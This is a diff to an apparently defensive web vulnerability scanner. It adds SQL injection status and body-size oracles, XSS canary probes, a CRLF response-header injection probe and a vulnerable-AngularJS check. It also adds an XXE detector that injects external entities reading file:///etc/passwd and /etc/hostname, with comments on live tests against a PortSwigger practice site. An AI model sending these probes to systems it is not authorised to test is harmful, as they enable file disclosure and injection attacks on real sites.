@@ -5,18 +5,18 @@ Every Detector implements the contract: prepare/mutate/execute/analyze/verify.
 from __future__ import annotations
 import re, urllib.parse
 from .core import (Endpoint, EventBus, Finding, FindingStatus, ParamKind, Severity,
-                   Evidence, Verification)
+                   Evidence, Verification, Parameter, ParamLocation)
 from .http_engine import RequestEngine, RequestMutation
 
 # ------------------------------------------------------------ Planner rules
 PLANNER_RULES = [
     (ParamKind.NUMERIC,   ["sql_injection"]),
-    (ParamKind.IDENTIFIER,["sql_injection", "idor"]),
-    (ParamKind.SEARCH,    ["sql_injection", "xss_reflected"]),
+    (ParamKind.IDENTIFIER,["sql_injection", "idor", "header_injection"]),
+    (ParamKind.SEARCH,    ["sql_injection", "xss_reflected", "header_injection"]),
     (ParamKind.URL,       ["open_redirect", "ssrf"]),
     (ParamKind.FILENAME,  ["path_traversal"]),
-    (ParamKind.HTML,      ["xss_reflected"]),
-    (ParamKind.GENERIC,   ["sql_injection", "xss_reflected"]),
+    (ParamKind.HTML,      ["xss_reflected", "header_injection"]),
+    (ParamKind.GENERIC,   ["sql_injection", "xss_reflected", "header_injection"]),
 ]
 
 def plan_for(ep: Endpoint) -> list[dict]:
@@ -74,6 +74,12 @@ class SQLiDetector(Detector):
         out = []
         for p in ep.parameters:
             base = p.value if p.value.isdigit() else "1"
+            # DETECT-04 (live-caught on ginandjuice.shop /catalog?category=): quote ->
+            # HTTP 500 with a GENERIC error page (no SQL keywords anywhere) — the old
+            # error-pattern check alone missed it. base + doubled-quote are the paired
+            # controls: base must be OK, and a VALID SQL string ('') must be OK too.
+            out.append(("base",        RequestMutation(endpoint=ep, param_name=p.name, param_value=base)))
+            out.append(("pair_quote",  RequestMutation(endpoint=ep, param_name=p.name, param_value=base + "''")))
             out.append(("quote_error", RequestMutation(endpoint=ep, param_name=p.name, param_value=base + "'")))
             out.append(("boolean_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base} AND 1=1")))
             out.append(("boolean_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base} AND 1=2")))
@@ -97,6 +103,18 @@ class SQLiDetector(Detector):
                 if mm:
                     ev.append(Evidence("db_error", f"{pat.pattern[:40]} matched: {mm.group(0)[:80]}", r.request_id))
                     break
+        # 1b) DETECT-04 — status oracle: quote breaks the server (5xx) while the base
+        # value AND a syntactically-valid doubled quote both succeed. A 5xx-on-quote
+        # alone is weak (apps crash on odd input); the paired controls make it a
+        # SQL-shaped signal. 4xx is deliberately EXCLUDED — ginandjuice ?productId=1'
+        # returns 400 "Invalid product ID" from input VALIDATION, not SQL (live-proven
+        # false lead: flagging it would have been a false positive).
+        rq, rb, rp = resp_map.get("quote_error"), resp_map.get("base"), resp_map.get("pair_quote")
+        if (rq is not None and rb is not None and rp is not None and
+                rq.status >= 500 and rb.ok and rp.ok):
+            ev.append(Evidence("status_oracle",
+                f"quote -> HTTP {rq.status} (generic error, no DB string) while base -> {rb.status} "
+                f"and doubled-quote -> {rp.status} — SQL syntax break", rq.request_id))
         # 2) boolean oracle (status differential, 200 vs 500) — the proven real-world oracle
         rt, rf = resp_map.get("boolean_true"), resp_map.get("boolean_false")
         oracle = False
@@ -111,7 +129,7 @@ class SQLiDetector(Detector):
                     f"body-size differential {len(rt.body)}B vs {len(rf.body)}B on condition flip", rt.request_id))
         # 3) DETECT-01 — OR-tautology redirect differential (auth-bypass oracle, string context)
         # ENG-01: hop_location() reads the FIRST-HOP target even when the engine
-        # auto-followed the redirect (old code saw only the final 200 — oracle destroyed).
+        # auto-follows the redirect (old code saw only the final 200 — oracle destroyed).
         ot, of = resp_map.get("or_true"), resp_map.get("or_false")
         if ot is not None and of is not None and ot.status and of.status:
             lt, lf = ot.hop_location(), of.hop_location()
@@ -120,6 +138,19 @@ class SQLiDetector(Detector):
                 ev.append(Evidence("redirect_diff",
                     f"OR-tautology redirect differential: TRUE -> {lt}, FALSE -> {lf} — auth-bypass oracle",
                     ot.request_id))
+            # 3b) DETECT-05 (live-caught on ginandjuice.shop /catalog?category=): the
+            # string-context OR pair must ALSO check the body-size differential — the
+            # redirect oracle only exists on auth flows; on data endpoints the tautology
+            # changes the RESULT SET SIZE instead (TRUE -> all products 17KB, FALSE ->
+            # empty category 9.4KB). The AND-pair already had this check; the OR pair
+            # (the only one that works in string contexts) did not.
+            elif ot.ok and of.ok and ot.status == of.status:
+                bt, bf = len(ot.body or ""), len(of.body or "")
+                if abs(bt - bf) > max(200, 0.25 * max(bt, bf, 1)):
+                    oracle = True
+                    ev.append(Evidence("response_diff",
+                        f"OR-pair body-size differential on condition flip: TRUE {bt}B vs FALSE {bf}B "
+                        f"(string-context boolean oracle)", ot.request_id))
         if not ev:
             return None
         return Finding(type="sql_injection", severity=self.severity, endpoint_url=ep.url,
@@ -132,17 +163,27 @@ class XSSDetector(Detector):
     CANARY = "sentinelxssmarker"
 
     def candidates(self, ep: Endpoint):
-        return [RequestMutation(endpoint=ep, param_name=p.name,
-                param_value=f"<{self.CANARY}>pro41</{self.CANARY}>") for p in ep.parameters]
+        out = []
+        for p in ep.parameters:
+            # VR-03 (live-caught on ginandjuice.shop /catalog?category=): the full-tag
+            # canary carries a closing tag </sentinelxssmarker> — apps that escape only
+            # the '/' (e.g. </ -> <\/ as JS-string hardening) break the needle match
+            # even though < and > pass RAW (real reflection: const x = "Gin<svg onload=..>").
+            # Slash-free variant detects the unescaped-markup weakness independently.
+            out.append(("full_tag", RequestMutation(endpoint=ep, param_name=p.name,
+                    param_value=f"<{self.CANARY}>pro41</{self.CANARY}>")))
+            out.append(("slash_free", RequestMutation(endpoint=ep, param_name=p.name,
+                    param_value=f"<{self.CANARY}pro42")))
+        return out
 
     def analyze(self, pair, resp):
         ep, p = pair
         if resp is None or not resp.body: return None
-        needle = f"<{self.CANARY}>pro41</{self.CANARY}>"
-        if needle in resp.body:
-            i = resp.body.find(needle)
-            ctx = resp.body[max(0, i - 60):i + len(needle) + 30].replace("\n", " ")
-            return Finding("xss_reflected", Severity.HIGH, ep.url, p.name, ep.method,
+        for needle in (f"<{self.CANARY}>pro41</{self.CANARY}>", f"<{self.CANARY}pro42"):
+            if needle in resp.body:
+                i = resp.body.find(needle)
+                ctx = resp.body[max(0, i - 60):i + len(needle) + 30].replace("\n", " ")
+                return Finding("xss_reflected", Severity.HIGH, ep.url, p.name, ep.method,
                            [Evidence("unescaped_reflection", f"canary reflected raw in context: …{ctx}…", resp.request_id)],
                            status=FindingStatus.CANDIDATE)
         return None
@@ -202,6 +243,145 @@ class RedirectDetector(Detector):
         return None
 
 
+class CrlfDetector(Detector):
+    """DETECT-07 (live-caught on ginandjuice.shop /catalog?category=): response header
+    injection. The category value flows into `Set-Cookie: category=<value>` WITHOUT
+    CRLF sanitization — %0d%0a in the param splits a second attacker-controlled header
+    (verified live: x-sentinel-probe appeared in real response headers). Detection:
+    inject a CRLF + uniquely-named probe header; if the server emits it, header
+    injection is proven. Enables cookie injection, CSP/Cache-Control override, session
+    fixation. Numeric params are skipped (never header-reflected in practice)."""
+    name, vuln_type = "crlf", "http_response_header_injection"
+    severity = Severity.HIGH
+    PROBE_VALUE = "sentinelcrlf\r\nX-Sentinel-Probe: injected"
+    PROBE_HEADER = "x-sentinel-probe"
+
+    def candidates(self, ep: Endpoint):
+        return [RequestMutation(endpoint=ep, param_name=p.name, param_value=self.PROBE_VALUE)
+                for p in ep.parameters if p.kind != ParamKind.NUMERIC]
+
+    def analyze(self, pair, resp):
+        ep, p = pair
+        if resp is None or not resp.headers: return None
+        v = resp.headers.get(self.PROBE_HEADER, "")
+        if v:
+            return Finding("http_response_header_injection", Severity.HIGH, ep.url, p.name, ep.method,
+                [Evidence("header_value",
+                          f"CRLF in param split a second response header: {self.PROBE_HEADER}: {v[:80]!r} "
+                          f"(attacker-controlled header injection)", resp.request_id)],
+                status=FindingStatus.CANDIDATE)
+        return None
+
+
+class XxeDetector(Detector):
+    """DETECT-08 (live-caught on ginandjuice.shop /catalog/product/stock): XML external
+    entity injection on endpoints whose REAL request shape is built by JavaScript
+    (form data is wrapped into <stockCheck> XML with Content-Type application/xml —
+    xmlStockCheckPayload.js). DISC-06 learns the XML root from that JS statically; this
+    detector then replays the transformation with external entities. No browser needed.
+
+    Live-proven oracle: entity-resolved file content changes the response body
+    (/etc/hostname -> 648, /etc/passwd -> 295, nonexistent -> 23); unreadable files
+    (/etc/shadow) equal the nonexistent control — true file-read semantics.
+
+    BLIND-XXE LIMIT (live-proven on ginandjuice.shop itself): when the response is
+    independent of entity content (random stock numbers per request — same file gave
+    23/768/52/191/52 across five probes), NO response-based oracle exists. The double-
+    control stability check (control probed twice, must match) rejects such noise at
+    detection time; blind XXE needs OOB/Collaborator confirmation (documented future
+    phase — parameter entities are blocked there, so even error-based tricks fail).
+
+    Two-phase probe: recon XML (form params only) reveals expected-but-missing
+    elements from the app's own error text ("Store ID could not be parsed" -> storeId);
+    then a 4-probe differential (control x2 vs /etc/hostname vs /etc/passwd)."""
+    name, vuln_type = "xxe", "xxe"
+    severity = Severity.CRITICAL
+    ENTITY = "sentinelxxe"
+    FILES = ["file:///etc/hostname", "file:///etc/passwd"]
+    CONTROL = "file:///nonexistent-sentinel-control"
+
+    def _xml(self, root, fields: list, entity_file=None, entity_target=None):
+        ents = (f'<!DOCTYPE {root} [<!ENTITY {self.ENTITY} SYSTEM "{entity_file}">]>'
+                if entity_file else "")
+        body = "".join(f"<{k}>{v}</{k}>" for k, v in fields)
+        if entity_target is not None:
+            body += f"<{entity_target}>&{self.ENTITY};</{entity_target}>"
+        return f'<?xml version="1.0" encoding="UTF-8"?>{ents}<{root}>{body}</{root}>'
+
+    def _mutation(self, ep, xml):
+        return RequestMutation(endpoint=ep, body_override=xml, method="POST",
+                               extra_headers={"Content-Type": "application/xml"})
+
+    def candidates(self, ep: Endpoint):
+        # Only POST endpoints with form params are candidates for XML replay, and only
+        # when the crawl statically learned an XML transformation from JS (DISC-06).
+        if (ep.method or "GET").upper() != "POST" or not ep.parameters:
+            return []
+        from .discovery import JS_XML_HINTS
+        roots = sorted(JS_XML_HINTS)
+        if not roots:
+            return []                       # no JS-learned XML transform: skip (request economy)
+        fields = [(p.name, p.value or "1") for p in ep.parameters]
+        return [(f"recon|{root}", self._mutation(ep, self._xml(root, fields)))
+                for root in roots]
+
+    def expand(self, ep, recon_resp, root):
+        """Phase 2 — build the entity differential probes from the recon response."""
+        fields = [(p.name, p.value or "1") for p in ep.parameters]
+        targets = [p.name for p in ep.parameters]
+        body = (recon_resp.body or "") if recon_resp else ""
+        # Error-driven element discovery: "Store ID could not be parsed" -> storeId
+        for m in re.finditer(r"([A-Za-z][a-z]{1,20}) ID could not be parsed", body):
+            word = m.group(1)
+            cand = word[0].lower() + word[1:] + "Id"
+            if cand and cand not in targets:
+                targets.append(cand)
+        probes = []
+        for t in targets[:4]:
+            # control TWICE: response-determinism gate (blind-XXE targets answer with
+            # per-request random values — an unstable control proves the response carries
+            # no entity-content information, so the differential is meaningless noise).
+            probes.append((f"control|{root}|{t}", self._mutation(ep, self._xml(root, fields, self.CONTROL, t))))
+            probes.append((f"control2|{root}|{t}", self._mutation(ep, self._xml(root, fields, self.CONTROL, t))))
+            for f in self.FILES:
+                probes.append((f"probe|{root}|{t}|{f}", self._mutation(ep, self._xml(root, fields, f, t))))
+        return probes
+
+    def analyze(self, pair, resp_map) -> Finding | None:
+        ep, _ = pair
+        by_elem: dict = {}
+        for key, r in resp_map.items():
+            parts = key.split("|")
+            if parts[0] == "probe":
+                by_elem.setdefault(parts[2], {})[parts[3]] = r
+            elif parts[0] in ("control", "control2"):
+                by_elem.setdefault(parts[2], {})[parts[0]] = r
+        for elem, m in by_elem.items():
+            ctrl, ctrl2 = m.get("control"), m.get("control2")
+            if ctrl is None or ctrl2 is None or len(m) < 4:
+                continue
+            # stability gate: same control payload twice must produce the SAME response
+            if ctrl.status != ctrl2.status or (ctrl.body or "") != (ctrl2.body or ""):
+                continue
+            diffs = []
+            for f, r in m.items():
+                if f in ("control", "control2"):
+                    continue
+                if r.status != ctrl.status or (r.body or "") != (ctrl.body or ""):
+                    diffs.append(f"{f.rsplit('/', 1)[-1]}: entity -> {r.status} {(r.body or '')[:30]!r} "
+                                 f"vs control {ctrl.status} {(ctrl.body or '')[:30]!r}")
+            # both fresh files must differ from control (2 independent confirmations)
+            if len(diffs) >= 2:
+                root = next((k.split("|")[1] for k in resp_map if k.startswith("probe|")), "?")
+                return Finding("xxe", Severity.CRITICAL, ep.url, elem, "POST",
+                    [Evidence("entity_differential",
+                              f"external entity resolution confirmed via response differential — {'; '.join(diffs[:3])}. "
+                              f"recipe: root={root} element={elem}",
+                              ctrl.request_id)],
+                    status=FindingStatus.CANDIDATE)
+        return None
+
+
 # ------------------------------------------------------------ Passive detectors
 SECURITY_HEADERS = ["strict-transport-security", "content-security-policy", "x-frame-options",
                     "x-content-type-options", "referrer-policy"]
@@ -224,7 +404,24 @@ def passive_audit(ep: Endpoint, resp) -> list[Finding]:
         out.append(Finding("tech_banner_disclosure", Severity.LOW, ep.url, "", ep.method,
                     [Evidence("header_value", f"X-Powered-By: {powered}", resp.request_id)],
                     status=FindingStatus.CANDIDATE))
+    # PASSIVE-02 (live-caught on ginandjuice.shop): vulnerable JS dependency detection —
+    # PortSwigger's scanme serves angular_1-7-7.js and lists "Vulnerable JavaScript
+    # dependency" in its own ground truth. Version-sniff the asset path.
+    base = ep.url.rsplit("/", 1)[-1].lower()
+    for pat, msg in VULN_JS_DEPS:
+        if pat.search(base):
+            out.append(Finding("vulnerable_js_dependency", Severity.LOW, ep.url, "", ep.method,
+                        [Evidence("banner", f"served asset {base!r}: {msg}", resp.request_id)],
+                        status=FindingStatus.CANDIDATE))
+            break
     return out
 
 
-ACTIVE_DETECTORS = [SQLiDetector, XSSDetector, TraversalDetector, RedirectDetector]
+# Known-vulnerable JS assets (extend as advisories accumulate; keep deterministic).
+VULN_JS_DEPS = [
+    (re.compile(r"angular[^/?]*[_.\-]?1[_.\-]?[0-9]"),
+     "AngularJS 1.x — end-of-life branch (Jan 2022); sandbox-escape / client-side template injection class (CVE-2019-10768, CVE-2024-21490)"),
+]
+
+
+ACTIVE_DETECTORS = [SQLiDetector, XSSDetector, TraversalDetector, RedirectDetector, CrlfDetector, XxeDetector]
